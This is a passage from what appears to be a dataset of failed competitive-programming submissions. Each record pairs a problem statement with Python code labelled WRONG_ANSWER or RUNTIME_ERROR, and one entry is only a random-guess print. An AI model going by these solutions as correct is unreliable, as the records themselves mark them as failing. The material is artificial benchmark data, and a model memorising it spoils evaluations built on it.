def push_up(self, i):\r\n        self.height[i] = self.min(self.height[2 * i], self.height[2 * i + 1])\r\n        return\r\n\r\n    def update_range(self, left, right, s, t, val, i):\r\n        # \u00e6\u009b\u00b4\u00e6\u0096\u00b0\u00e5\u008c\u00ba\u00e9\u0097\u00b4\u00e6\u009c\u0080\u00e5\u00b0\u008f\u00e5\u0080\u00bc\r\n        stack = [[s, t, i]]\r\n        while stack:\r\n            a, b, i = stack.pop()\r\n            if i >= 0:\r\n                if left <= a and b <= right:\r\n                    self.make_tag(i, val)\r\n                    continue\r\n\r\n                self.push_down(i)\r\n                stack.append([a, b, ~i])\r\n                m = a + (b - a) \/\/ 2\r\n                if left <= m:  # \u00e6\u00b3\u00a8\u00e6\u0084\u008f\u00e5\u00b7\u00a6\u00e5\u008f\u00b3\u00e5\u00ad\u0090\u00e6\u00a0\u0091\u00e7\u009a\u0084\u00e8\u00be\u00b9\u00e7\u0095\u008c\u00e4\u00b8\u008e\u00e8\u008c\u0083\u00e5\u009b\u00b4\r\n                    stack.append([a, m, 2 * i])\r\n                if right > m:\r\n                    stack.append([m + 1, b, 2 * i + 1])\r\n            else:\r\n                i = ~i\r\n                self.push_up(i)\r\n        return\r\n\r\n    def update_point(self, left, right, s, t, val, i):\r\n        # \u00e6\u009b\u00b4\u00e6\u0096\u00b0\u00e5\u008d\u0095\u00e7\u0082\u00b9\u00e6\u009c\u0080\u00e5\u00b0\u008f\u00e5\u0080\u00bc\r\n        while True:\r\n            if left <= s and t <= right:\r\n                self.make_tag(i, val)\r\n                break\r\n            self.push_down(i)\r\n            m = s + (t - s) \/\/ 2\r\n            if left <= m:  # \u00e6\u00b3\u00a8\u00e6\u0084\u008f\u00e5\u00b7\u00a6\u00e5\u008f\u00b3\u00e5\u00ad\u0090\u00e6\u00a0\u0091\u00e7\u009a\u0084\u00e8\u00be\u00b9\u00e7\u0095\u008c\u00e4\u00b8\u008e\u00e8\u008c\u0083\u00e5\u009b\u00b4\r\n                s, t, i = s, m, 2 * i\r\n            if right > m:\r\n                s, t, i = m + 1, t, 2 * i + 1\r\n\r\n        while i > 1:\r\n            i \/\/= 2\r\n            self.push_up(i)\r\n        return\r\n\r\n    def query_range(self, left, right, s, t, i):\r\n        # \u00e6\u009f\u00a5\u00e8\u00af\u00a2\u00e5\u008c\u00ba\u00e9\u0097\u00b4\u00e7\u009a\u0084\u00e6\u009c\u0080\u00e5\u00b0\u008f\u00e5\u0080\u00bc\r\n        stack = [[s, t, i]]\r\n        floor = inf\r\n        while stack:\r\n            a, b, i = stack.pop()\r\n            if left <= a and b <= right:\r\n                floor = self.min(floor, self.height[i])\r\n                continue\r\n            self.push_down(i)\r\n            m = a + (b - a) \/\/ 2\r\n            if left <= m:\r\n                stack.append([a, m, 2*i])\r\n            if right > m:\r\n                stack.append([m+1, b, 2*i + 1])\r\n        return floor\r\n\r\n    def query_point(self, left, right, s, t, i):\r\n        # \u00e6\u009f\u00a5\u00e8\u00af\u00a2\u00e5\u008d\u0095\u00e7\u0082\u00b9\u00e7\u009a\u0084\u00e6\u009c\u0080\u00e5\u00b0\u008f\u00e5\u0080\u00bc\r\n        a, b, i = s, t, i\r\n        while True:\r\n            if left <= a and b <= right:\r\n                ans = self.height[i]\r\n                break\r\n            self.push_down(i)\r\n            m = a + (b - a) \/\/ 2\r\n            if left <= m:\r\n                a, b, i = a, m, 2 * i\r\n            if right > m:\r\n                a, b, i = m + 1, b, 2 * i + 1\r\n        return ans\r\n\r\nclass Solution:\r\n    def __init__(self):\r\n        return\r\n\r\n    @staticmethod\r\n    def main(ac=FastIO()):\r\n        n, k = ac.read_list_ints()\r\n        s = ac.read_str()\r\n        tree = SegmentTreeUpdateQueryMin(n)\r\n        one = -1\r\n        for i in range(n):\r\n            if s[i] == \"1\":\r\n                left = ac.max(0, i-k)\r\n                right = ac.min(n-1, i+k)\r\n                if left < one:\r\n                    left = one+k+1\r\n                if left > i:\r\n                    left = i\r\n                pre = tree.query_range(left-1, left-1, 0, n-1, 1) if left else 0\r\n                cur = pre + i+1\r\n                tree.update_range(i, right, 0, n-1, cur, 1)\r\n                one = i\r\n            else:\r\n                pre = tree.query_point(i-1, i-1, 0, n-1, 1) if i else 0\r\n                cur = pre + i+1\r\n                tree.update_point(i, i, 0, n-1, cur, 1)\r\n        ac.st(tree.query_point(n-1, n-1, 0, n-1, 1))\r\n        return\r\n\r\n\r\nSolution().main()\r\n","description":"You work as a system administrator in a dormitory, which has $$$n$$$ rooms one after another along a straight hallway. Rooms are numbered from $$$1$$$ to $$$n$$$.You have to connect all $$$n$$$ rooms to the Internet.You can connect each room to the Internet directly, the cost of such connection for the $$$i$$$-th room is $$$i$$$ coins. Some rooms also have a spot for a router. The cost of placing a router in the $$$i$$$-th room is also $$$i$$$ coins. You cannot place a router in a room which does not have a spot for it. When you place a router in the room $$$i$$$, you connect all rooms with the numbers from $$$max(1,~i - k)$$$ to $$$min(n,~i + k)$$$ inclusive to the Internet, where $$$k$$$ is the range of router. The value of $$$k$$$ is the same for all routers. Calculate the minimum total cost of connecting all $$$n$$$ rooms to the Internet. You can assume that the number of rooms which have a spot for a router is not greater than the number of routers you have.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains two integers $$$n$$$ and $$$k$$$ ($$$1 \\le n, k \\le 2 \\cdot 10^5$$$) \u2014 the number of rooms and the range of each router.\nThe second line of the input contains one string $$$s$$$ of length $$$n$$$, consisting only of zeros and ones. If the $$$i$$$-th character of the string equals to '1' then there is a spot for a router in the $$$i$$$-th room. If the $$$i$$$-th character of the string equals to '0' then you cannot place a router in the $$$i$$$-th room.\n","output_spec":"Print one integer \u2014 the minimum total cost of connecting all $$$n$$$ rooms to the Internet.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":2200,"lang":"PyPy 2","lang_cluster":"python","src_uid":"1220_E","submission_id":"60811805","tags":["dfs+and+similar","dp","dsu","graphs","greedy","trees"],"exec_outcome":"RUNTIME_ERROR","source_code":"import os\r\nimport sys\r\nfrom atexit import register\r\nfrom io import BytesIO\r\n\r\nsys.stdin = BytesIO(os.read(0, os.fstat(0).st_size))\r\nsys.stdout = BytesIO()\r\nregister(lambda: os.write(1, sys.stdout.getvalue()))\r\n\r\ninput = lambda: sys.stdin.readline().rstrip('\\r\\n')\r\ndef make(size):\r\n    rank = [0]*size\r\n    same = range(size)\r\n    return same,rank\r\n\r\ndef find(x,same):\r\n\r\n    if x != same[x]:\r\n        same[x] = find(same[x],same)\r\n    return same[x]\r\n\r\ndef union( x,y,same,rank):\r\n    x = find(x,same)\r\n    y = find(y,same)\r\n    if x == y :\r\n        return\r\n    if rank[x] > rank[y]:\r\n        same[y] = x\r\n    else:\r\n        same[x] = y\r\n    if rank[x] == rank[y]:\r\n        rank[y] += 1\r\n\r\ndef add(dic,k,v):\r\n\tif not dic.has_key(k):\r\n\t\tdic[k] = v\r\n\telse:\r\n\t\tdic[k]+= v\r\nn,m = map(int,input().split(\" \"))\r\nws = map(int,input().split(\" \"))\r\nsame,rank = make(n+1)\r\nedges = []\r\ndegrees = [0]*(n+1)\r\nfor i in range(m):\r\n\ta,b = map(int,input().split(\" \"))\r\n\tedges.append((a,b))\r\n\tdegrees[a] += 1\r\n\tdegrees[b] += 1\r\n\r\ns = int(input())\r\nfor a,b in edges:\r\n\tif a!=s and b!=s:\r\n\t\tunion(a,b,same,rank)\r\n\r\nfor i in range(n+1):\r\n\tsame[i]=find(i,same)\r\ndic = {}\r\n\r\nfor i,v in enumerate(same):\r\n\tadd(dic,v,[i])\r\n\r\nret = 0\r\nfor k,v in dic.items():\r\n\tans = 0\r\n\tmaxv = 0\t\r\n\tfor i in v:\r\n\t\tif degrees[i] >= 2 or i == s:\r\n\t\t\tans += ws[i-1]\r\n\t\telse:\r\n\t\t\tmaxv = max(maxv,ws[i-1])\r\n\tret  = max(ret,maxv+ans)\r\nprint ret+ws[s-1]\r\n\r\n\r\n","description":"Alex decided to go on a touristic trip over the country.For simplicity let's assume that the country has $$$n$$$ cities and $$$m$$$ bidirectional roads connecting them. Alex lives in city $$$s$$$ and initially located in it. To compare different cities Alex assigned each city a score $$$w_i$$$ which is as high as interesting city seems to Alex.Alex believes that his trip will be interesting only if he will not use any road twice in a row. That is if Alex came to city $$$v$$$ from city $$$u$$$, he may choose as the next city in the trip any city connected with $$$v$$$ by the road, except for the city $$$u$$$.Your task is to help Alex plan his city in a way that maximizes total score over all cities he visited. Note that for each city its score is counted at most once, even if Alex been there several times during his trip.","input_from":"standard input","output_to":"standard output","input_spec":"First line of input contains two integers $$$n$$$ and $$$m$$$, ($$$1 \\le n \\le 2 \\cdot 10^5$$$, $$$0 \\le m \\le 2 \\cdot 10^5$$$) which are numbers of cities and roads in the country.\nSecond line contains $$$n$$$ integers $$$w_1, w_2, \\ldots, w_n$$$ ($$$0 \\le w_i \\le 10^9$$$) which are scores of all cities.\nThe following $$$m$$$ lines contain description of the roads. Each of these $$$m$$$ lines contains two integers $$$u$$$ and $$$v$$$ ($$$1 \\le u, v \\le n$$$) which are cities connected by this road.\nIt is guaranteed that there is at most one direct road between any two cities, no city is connected to itself by the road and, finally, it is possible to go from any city to any other one using only roads.\nThe last line contains single integer $$$s$$$ ($$$1 \\le s \\le n$$$), which is the number of the initial city.\n","output_spec":"Output single integer which is the maximum possible sum of scores of visited cities.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":2000,"lang":"Python 2","lang_cluster":"python","src_uid":"13fa378c913bb7a15612327099b59f83","submission_id":"re_632","tags":["dp","greedy","math","implementation","data structures","trees"],"exec_outcome":"RUNTIME_ERROR","source_code":"(n , m) = map(int,raw_input().split())\n\narr = []\n\nfor i in range (n):\n    arr.append(map(int,raw_input().split())[1:])\n\nseq = map(int,raw_input().split())\n\ndef gao(x):\n    ans = - 2 ** 64\n    now = 0\n    for i in range (len(x)):\n        now += x[i]\n        ans = max(ans,now)\n    return ans;\ndef gao2(x):\n    now = x[0]\n    ans = now\n    for i in range(1,len(x)):\n        now = max(x[i] , now + x[i]) \n        ans = max(ans,now)\n    return ans\ndef doit(x):\n    ans = - 2 ** 64\n    now = 0\n    for i in range (len(x) - 1, -1 , -1):\n        now += x[i]\n        ans = max(ans,now)\n    return ans;\n\ndp = []\npre = []\ns = []\naf = []\n\nfor i in range (n):\n    pre.append(doit(arr[i]))\n    s.append(sum(arr[i]))\n    af.append(gao(arr[i]))\n\ndp.append([sum(arr[seq[0] - 1]),pre[seq[0] - 1]])\n\nfor i in range (1,m):\n    add = max(dp[-1][0],pre[seq[i-1] - 1])\n    dp.append([ add + s[seq[i] - 1] , add + af[seq[i] - 1]  ]  )\n\nans = - 2 ** 64\n\nfor i in range (len(seq)):\n    ans = max(ans,gao2(arr[seq[i] - 1]))\n\nfor i in range (len(dp)):\n    ans = max(ans,dp[i][0])\n    ans = max(ans,dp[i][1])\n\nprint ans\n","description":"Ahmed and Mostafa used to compete together in many programming contests for several years. Their coach Fegla asked them to solve one challenging problem, of course Ahmed was able to solve it but Mostafa couldn't.This problem is similar to a standard problem but it has a different format and constraints.In the standard problem you are given an array of integers, and you have to find one or more consecutive elements in this array where their sum is the maximum possible sum.But in this problem you are given n small arrays, and you will create one big array from the concatenation of one or more instances of the small arrays (each small array could occur more than once). The big array will be given as an array of indexes (1-based) of the small arrays, and the concatenation should be done in the same order as in this array. Then you should apply the standard problem mentioned above on the resulting big array.For example let's suppose that the small arrays are {1, 6, -2}, {3, 3} and {-5, 1}. And the indexes in the big array are {2, 3, 1, 3}. So the actual values in the big array after formatting it as concatenation of the small arrays will be {3, 3, -5, 1, 1, 6, -2, -5, 1}. In this example the maximum sum is 9.Can you help Mostafa solve this problem?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m, n is the number of the small arrays (1\u2009\u2264\u2009n\u2009\u2264\u200950), and m is the number of indexes in the big array (1\u2009\u2264\u2009m\u2009\u2264\u2009250000). Then follow n lines, the i-th line starts with one integer l which is the size of the i-th array (1\u2009\u2264\u2009l\u2009\u2264\u20095000), followed by l integers each one will be greater than or equal -1000 and less than or equal 1000. The last line contains m integers which are the indexes in the big array, and you should concatenate the small arrays in the same order, and each index will be greater than or equal to 1 and less than or equal to n. The small arrays are numbered from 1 to n in the same order as given in the input. Some of the given small arrays may not be used in big array. Note, that the array is very big. So if you try to build it straightforwardly, you will probably get time or\/and memory limit exceeded.","output_spec":"Print one line containing the maximum sum in the big array after formatting it as described above. You must choose at least one element for the sum, i. e. it cannot be empty. Please, do not use %lld specificator to write 64-bit integers in C++. It is preferred to use cout (also you may use %I64d).","notes":null,"sample_inputs":["3 4\n3 1 6 -2\n2 3 3\n2 -5 1\n2 3 1 3","6 1\n4 0 8 -3 -10\n8 3 -2 -5 10 8 -9 -5 -4\n1 0\n1 -3\n3 -8 5 6\n2 9 6\n1"],"sample_outputs":["9","8"]}
{"difficulty":1800,"lang":"PyPy 3-64","lang_cluster":"python","src_uid":"15_B","submission_id":"191480186","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"import sys; R = sys.stdin.readline\r\nfor _ in range(int(R())):\r\n    n,m,x1,y1,x2,y2 = map(int,R().split())\r\n    a,b = abs(x1-x2),abs(y1-y2)\r\n    print(n*m-2*abs(x1-x2)*abs(y1-y2)+(2*a-n if 2*a>n else 0)*(2*b-n if 2*b>n else 0))","description":"Petya is the most responsible worker in the Research Institute. So he was asked to make a very important experiment: to melt the chocolate bar with a new laser device. The device consists of a rectangular field of n\u00d7m cells and a robotic arm. Each cell of the field is a 1\u00d71 square. The robotic arm has two lasers pointed at the field perpendicularly to its surface. At any one time lasers are pointed at the centres of some two cells. Since the lasers are on the robotic hand, their movements are synchronized \u2014 if you move one of the lasers by a vector, another one moves by the same vector.The following facts about the experiment are known:   initially the whole field is covered with a chocolate bar of the size n\u00d7m, both lasers are located above the field and are active;  the chocolate melts within one cell of the field at which the laser is pointed;  all moves of the robotic arm should be parallel to the sides of the field, after each move the lasers should be pointed at the centres of some two cells;  at any one time both lasers should be pointed at the field. Petya doesn't want to become a second Gordon Freeman. You are given n, m and the cells (x1,y1) and (x2,y2), where the lasers are initially pointed at (xi is a column number, yi is a row number). Rows are numbered from 1 to m from top to bottom and columns are numbered from 1 to n from left to right. You are to find the amount of cells of the field on which the chocolate can't be melted in the given conditions.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains one integer number t (1\u2264t\u226410000) \u2014 the number of test sets. Each of the following t lines describes one test set. Each line contains integer numbers n, m, x1, y1, x2, y2, separated by a space (2\u2264n,m\u226410^9, 1\u2264x1,x2\u2264n, 1\u2264y1,y2\u2264m). Cells (x1,y1) and (x2,y2) are distinct.\n","output_spec":"Each of the t lines of the output should contain the answer to the corresponding input test set.\n","notes":null,"sample_inputs":["2\n4 4 1 1 3 3\n4 3 1 1 2 2\n"],"sample_outputs":["8\n2\n"]}
{"difficulty":2200,"lang":"PyPy 3-64","lang_cluster":"python","src_uid":"19_C","submission_id":"208977706","tags":["greedy","hashing","string+suffix+structures"],"exec_outcome":"WRONG_ANSWER","source_code":"import sys\nn=int(input())\na=list(map(int,input().split()))\nM=10**9+1\ng={}\nfor i in range(n):\n    g[a[i]]=g.get(a[i],[])+[i]\np=[1]\nfor i in range(n):\n    p+=[hash(M*p[-1])]\nh=[0]*(n+1)\nfor i in range(n):\n    h[i+1]=hash(h[i]*M+a[i])\n\ngh=lambda k,l:hash(h[k+l]-h[k]*p[l])%sys.hash_info.modulus\ni,t=0,0\n\nfor i in range(n):\n    for j in g[a[i]]:\n        if j <= i:\n            continue\n        w=j-i\n        if j+w<=n and gh(i,w)==gh(j,w):\n            i=j-1\n            t=max(t,j)\n            break\n\nr=a[t:]\nprint(len(r))\nprint(*r)\n\n","description":"Once Bob saw a string. It contained so many different letters, that the letters were marked by numbers, but at the same time each letter could be met in the string at most 10 times. Bob didn't like that string, because it contained repeats: a repeat of length x is such a substring of length 2x, that its first half coincides character by character with its second half. Bob started deleting all the repeats from the string. He does it as follows: while it's possible, Bob takes the shortest repeat, if it is not unique, he takes the leftmost one, and deletes its left half and everything that is to the left of this repeat.You're given the string seen by Bob. Find out, what it will look like after Bob deletes all the repeats in the way described above.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer n (1\u2264n\u226410^5) \u2014 length of the string. The following line contains n space-separated integer numbers from 0 to 10^9 inclusive \u2014 numbers that stand for the letters of the string. It's guaranteed that each letter can be met in the string at most 10 times.\n","output_spec":"In the first line output the length of the string's part, left after Bob's deletions. In the second line output all the letters (separated by a space) of the string, left after Bob deleted all the repeats in the described way.\n","notes":null,"sample_inputs":["6\n1 2 3 1 2 3\n","7\n4 5 6 5 6 7 7\n"],"sample_outputs":["3\n1 2 3 \n","1\n7 \n"]}
{"difficulty":1900,"lang":"PyPy 3-64","lang_cluster":"python","src_uid":"22_D","submission_id":"216004093","tags":["greedy","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"print(\"_RANDOM_GUESS_1690485752.7442563\")# 1690485752.7442749","description":"You are given n segments on the Ox-axis. You can drive a nail in any integer point on the Ox-axis line nail so, that all segments containing this point, are considered nailed down. If the nail passes through endpoint of some segment, this segment is considered to be nailed too. What is the smallest number of nails needed to nail all the segments down?","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains single integer number n (1\u2264n\u22641000) \u2014 amount of segments. Following n lines contain descriptions of the segments. Each description is a pair of integer numbers \u2014 endpoints coordinates. All the coordinates don't exceed 10000 by absolute value. Segments can degenarate to points.\n","output_spec":"The first line should contain one integer number \u2014 the smallest number of nails needed to nail all the segments down. The second line should contain coordinates of driven nails separated by space in any order. If the answer is not unique, output any.\n","notes":null,"sample_inputs":["2\n0 2\n2 5\n","5\n0 3\n4 2\n4 8\n8 10\n7 7\n"],"sample_outputs":["1\n2 ","3\n7 10 3\n"]}
{"difficulty":2500,"lang":"PyPy 3-64","lang_cluster":"python","src_uid":"23_E","submission_id":"181835795","tags":["dp"],"exec_outcome":"WRONG_ANSWER","source_code":"import random\r\nimport sys\r\nimport os\r\nimport math\r\nfrom collections import Counter, defaultdict, deque\r\nfrom functools import lru_cache, reduce\r\nfrom itertools import accumulate, combinations, permutations\r\nfrom heapq import nsmallest, nlargest, heapify, heappop, heappush\r\nfrom io import BytesIO, IOBase\r\nfrom copy import deepcopy\r\nimport threading\r\nimport bisect\r\nBUFSIZE = 4096\r\n\r\n\r\nclass FastIO(IOBase):\r\n    newlines = 0\r\n\r\n    def __init__(self, file):\r\n        self._fd = file.fileno()\r\n        self.buffer = BytesIO()\r\n        self.writable = \"x\" in file.mode or \"r\" not in file.mode\r\n        self.write = self.buffer.write if self.writable else None\r\n\r\n    def read(self):\r\n        while True:\r\n            b = os.read(self._fd, max(os.fstat(self._fd).st_size, BUFSIZE))\r\n            if not b:\r\n                break\r\n            ptr = self.buffer.tell()\r\n            self.buffer.seek(0, 2), self.buffer.write(b), self.buffer.seek(ptr)\r\n        self.newlines = 0\r\n        return self.buffer.read()\r\n\r\n    def readline(self):\r\n        while self.newlines == 0:\r\n            b = os.read(self._fd, max(os.fstat(self._fd).st_size, BUFSIZE))\r\n            self.newlines = b.count(b\"\\n\") + (not b)\r\n            ptr = self.buffer.tell()\r\n            self.buffer.seek(0, 2), self.buffer.write(b), self.buffer.seek(ptr)\r\n        self.newlines -= 1\r\n        return self.buffer.readline()\r\n\r\n    def flush(self):\r\n        if self.writable:\r\n            os.write(self._fd, self.buffer.getvalue())\r\n            self.buffer.truncate(0), self.buffer.seek(0)\r\n\r\nclass IOWrapper(IOBase):\r\n    def __init__(self, file):\r\n        self.buffer = FastIO(file)\r\n        self.flush = self.buffer.flush\r\n        self.writable = self.buffer.writable\r\n        self.write = lambda s: self.buffer.write(s.encode(\"ascii\"))\r\n        self.read = lambda: self.buffer.read().decode(\"ascii\")\r\n        self.readline = lambda: self.buffer.readline().decode(\"ascii\")\r\n\r\nsys.stdin = IOWrapper(sys.stdin)\r\nsys.stdout = IOWrapper(sys.stdout)\r\ninput = lambda: sys.stdin.readline().rstrip(\"\\r\\n\")\r\n\r\ndef I():\r\n    return input()\r\n\r\ndef II():\r\n    return int(input())\r\n\r\ndef MI():\r\n    return map(int, input().split())\r\n\r\ndef LI():\r\n    return list(input().split())\r\n\r\ndef LII():\r\n    return list(map(int, input().split()))\r\n\r\ndef GMI():\r\n    return map(lambda x: int(x) - 1, input().split())\r\n\r\ndef LGMI():\r\n    return list(map(lambda x: int(x) - 1, input().split()))\r\n\r\nn = II()\r\nif n <= 4: print(n)\r\nelif n % 3 == 0: print(pow(3, n \/\/ 3))\r\nelif n % 3 == 1: print(pow(3, (n - 4) \/\/ 3) * 4)\r\nelse: print(pow(3, (n - 2) \/\/ 3) * 2)","description":"Recently Bob invented a new game with a tree (we should remind you, that a tree is a connected graph without cycles): he deletes any (possibly, zero) amount of edges of the tree, and counts the product of sizes of the connected components left after the deletion. Your task is to find out the maximum number that Bob can get in his new game for a given tree.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer number n (1\u2264n\u2264700) \u2014 amount of vertices in the tree. The following n-1 lines contain the description of the edges. Each line contains the pair of vertices' indexes, joined by an edge, ai, bi (1\u2264ai,bi\u2264n). It's guaranteed that the graph described in the input is a tree.\n","output_spec":"Output the only number \u2014 the maximum product of sizes of the connected components, that Bob can get after deleting some of the tree's edges.\n","notes":null,"sample_inputs":["5\n1 2\n2 3\n3 4\n4 5\n","8\n1 2\n1 3\n2 4\n2 5\n3 6\n3 7\n6 8\n","3\n1 2\n1 3\n"],"sample_outputs":["6","18","3"]}
{"difficulty":1600,"lang":"Python 3","lang_cluster":"python","src_uid":"29d4ca13888c0e172dde315b66380fe5","submission_id":"re_744","tags":["geometry"],"exec_outcome":"RUNTIME_ERROR","source_code":"s=input()\nl=[]\nl=list(map(int,s.split()))\nR=l[0]\nr=0\nx1=l[1]\ny1=l[2]\nx2=l[3]\ny2=l[4]\nd=(((x2-x1)**2)+((y2-y1)**2))**0.5\nif(d>=R):\n    r=(R)\n    xa=x1\n    ya=y1\nelse:\n    r=(R+d)\/2\n    xa=(x2+(((R+d)*x1)-R*x2)\/d)\/2\n    ya=(y2+(((R+d)*y1)-R*y2)\/d)\/2\nprint(xa)\nprint(ya)\nprint(r)\n\n","description":"Fifa and Fafa are sharing a flat. Fifa loves video games and wants to download a new soccer game. Unfortunately, Fafa heavily uses the internet which consumes the quota. Fifa can access the internet through his Wi-Fi access point. This access point can be accessed within a range of r meters (this range can be chosen by Fifa) from its position. Fifa must put the access point inside the flat which has a circular shape of radius R. Fifa wants to minimize the area that is not covered by the access point inside the flat without letting Fafa or anyone outside the flat to get access to the internet.The world is represented as an infinite 2D plane. The flat is centered at (x1,\u2009y1) and has radius R and Fafa's laptop is located at (x2,\u2009y2), not necessarily inside the flat. Find the position and the radius chosen by Fifa for his access point which minimizes the uncovered area.","input_from":"standard input","output_to":"standard output","input_spec":"The single line of the input contains 5 space-separated integers R,\u2009x1,\u2009y1,\u2009x2,\u2009y2 (1\u2009\u2264\u2009R\u2009\u2264\u2009105, |x1|,\u2009|y1|,\u2009|x2|,\u2009|y2|\u2009\u2264\u2009105).","output_spec":"Print three space-separated numbers xap,\u2009yap,\u2009r where (xap,\u2009yap) is the position which Fifa chose for the access point and r is the radius of its range.  Your answer will be considered correct if the radius does not differ from optimal more than 10\u2009-\u20096 absolutely or relatively, and also the radius you printed can be changed by no more than 10\u2009-\u20096 (absolutely or relatively) in such a way that all points outside the flat and Fafa's laptop position are outside circle of the access point range.","notes":null,"sample_inputs":["5 3 3 1 1","10 5 5 5 15"],"sample_outputs":["3.7677669529663684 3.7677669529663684 3.914213562373095","5.0 5.0 10.0"]}
{"difficulty":1900,"lang":"Python 2","lang_cluster":"python","src_uid":"34b67958a37865e1ca0529bbf528dd9a","submission_id":"re_1281","tags":["greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"C=lambda c:10-c if c else 0\ndef s(v,c):\n\tn=C(c)\n\tif v[c]*v[n]<1:return 0\n\ta=v[:];b=v[:];a[c]-=1;b[n]-=1\n\tx=max(0,(b[0]-a[9]));a[0]-=x;b[0]-=x\n\treturn(x+1+sum(min(v[i],b[9-i])for i in range(10)),x)\na=raw_input()\nv=[a.count(`i`)for i in range(10)]\nb=d=0\nfor c in range(6):\n\tt=s(v,c)\n\tif t>b:b=t;d=c\nif b==0:print a;print a;exit()\nz=b[1]\nv[0]-=z\nn=C(d)\nX=`d`;x=v[:];x[d]-=1\nY=`n`;y=v[:];y[n]-=1\nfor i in range(10):m=min(x[i],y[9-i]);X=`i`*m+X;Y=`9-i`*m+Y;x[i]-=m;y[9-i]-=m;\nZ=lambda v:\"\".join(`i`*n for i,n in enumerate(v))\nprint Z(x)+X+\"0\"*z\nprint Z(y)+Y+\"0\"*z\n","description":"Andrey's favourite number is n. Andrey's friends gave him two identical numbers n as a New Year present. He hung them on a wall and watched them adoringly.Then Andrey got bored from looking at the same number and he started to swap digits first in one, then in the other number, then again in the first number and so on (arbitrary number of changes could be made in each number). At some point it turned out that if we sum the resulting numbers, then the number of zeroes with which the sum will end would be maximum among the possible variants of digit permutations in those numbers.Given number n, can you find the two digit permutations that have this property?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n \u2014 the original number. The number of digits in this number does not exceed 105. The number is written without any leading zeroes.","output_spec":"Print two permutations of digits of number n, such that the sum of these numbers ends with the maximum number of zeroes. The permutations can have leading zeroes (if they are present, they all should be printed). The permutations do not have to be different. If there are several answers, print any of them.","notes":null,"sample_inputs":["198","500"],"sample_outputs":["981\n819","500\n500"]}
{"difficulty":1900,"lang":"PyPy 3-64","lang_cluster":"python","src_uid":"599_D","submission_id":"215749834","tags":["brute+force","math"],"exec_outcome":"WRONG_ANSWER","source_code":"x = 0\r\np = [x := x + i ** 2 for i in range(1, 2000001)]\r\n\r\n\r\ndef f(a, b):\r\n    return a * a * b - ((a * (a - 1)) \/\/ 2) * (a + b) + (p[a - 2] if a >= 2 else 0)\r\n\r\n\r\ndef ff(a, x):\r\n    C = 0 if a < 2 else p[a - 2]\r\n    nom = 2 * x - 2 * C - a * a * a + a * a\r\n    denom = 3 * a * a - a\r\n    if nom % denom == 0:\r\n        return nom \/\/ denom\r\n    return -1\r\n\r\n\r\ndef binary_search(a, x):\r\n    l = a\r\n    r = x + 1\r\n    while l < r:\r\n        mid = (l + r) \/\/ 2\r\n        v = f(a, mid)\r\n        if v < x:\r\n            l = mid + 1\r\n        elif v > x:\r\n            r = mid\r\n        else:\r\n            return mid\r\n    return l\r\n\r\n\r\ndef __main__():\r\n    x = int(input())\r\n    res = []\r\n\r\n    for a in range(1, 2000000):\r\n        b = ff(a, x)\r\n        if b != -1:\r\n            res.append((a, b))\r\n\r\n    if res[-1][0] == res[-1][1]:\r\n        print(2 * len(res) - 1)\r\n    else:\r\n        print(2 * len(res))\r\n\r\n    for r in res:\r\n        print(r[0], r[1])\r\n\r\n    for r in reversed(res):\r\n        if r[0] != r[1]:\r\n            print(r[1], r[0])\r\n\r\n    return\r\n\r\n\r\n__main__()","description":"Spongebob is already tired trying to reason his weird actions and calculations, so he simply asked you to find all pairs of n and m, such that there are exactly x distinct squares in the table consisting of n rows and m columns. For example, in a 3\u00d75 table there are 15 squares with side one, 8 squares with side two and 3 squares with side three. The total number of distinct squares in a 3\u00d75 table is 15+8+3=26.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains a single integer x (1\u2264x\u226410^18)\u00a0\u2014 the number of squares inside the tables Spongebob is interested in.\n","output_spec":"First print a single integer k\u00a0\u2014 the number of tables with exactly x distinct squares inside.\nThen print k pairs of integers describing the tables. Print the pairs in the order of increasing n, and in case of equality\u00a0\u2014 in the order of increasing m.\n","notes":"In a 1\u00d72 table there are 2 1\u00d71 squares. So, 2 distinct squares in total.\n \nIn a 2\u00d73 table there are 6 1\u00d71 squares and 2 2\u00d72 squares. That is equal to 8 squares in total.\n \n","sample_inputs":["26\n","2\n","8\n"],"sample_outputs":["6\n1 26\n2 9\n3 5\n5 3\n9 2\n26 1\n","2\n1 2\n2 1\n","4\n1 8\n2 3\n3 2\n8 1\n"]}
{"difficulty":1900,"lang":"Python 3","lang_cluster":"python","src_uid":"6214a85d2be0a908dcbfe089327cf51a","submission_id":"re_942","tags":["games"],"exec_outcome":"RUNTIME_ERROR","source_code":"n, m, k = [int(x) for x in input().split()]\ncanwin = False\nfor i in range(k):\n  x, y = [int(x) for x in input().split()]\n  canwin |= x < 8 or n - x < 7\n  canwin |= y < 8 or m - y < 7\nprint(\"YES\" if canwin else \"NO\")\n","description":"Volodya and Vlad play the following game. There are k pies at the cells of n\u2009\u2009\u00d7\u2009\u2009m board. Each turn Volodya moves one pie to the neighbouring (by side) cell. If the pie lies at the border of the board then Volodya can move it outside the board, get the pie and win. After Volodya's move, Vlad bans some edge at the border of the board of length 1 (between two knots of the board) so that Volodya is not able to move the pie outside the board through this edge anymore. The question is: will Volodya win this game? We suppose both players follow the optimal strategy.","input_from":"standard input","output_to":"standard output","input_spec":"First line contains 3 integers, separated by space: 1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100 \u2014 dimensions of the board and 0\u2009\u2264\u2009k\u2009\u2264\u2009100 \u2014 the number of pies. Each of the next k lines contains 2 integers, separated by space: 1\u2009\u2264\u2009x\u2009\u2264\u2009n, 1\u2009\u2264\u2009y\u2009\u2264\u2009m \u2014 coordinates of the corresponding pie. There could be more than one pie at a cell. ","output_spec":"Output only one word: \"YES\" \u2014 if Volodya wins, \"NO\" \u2014 otherwise.","notes":null,"sample_inputs":["2 2 1\n1 2","3 4 0","100 50 2\n50 25\n50 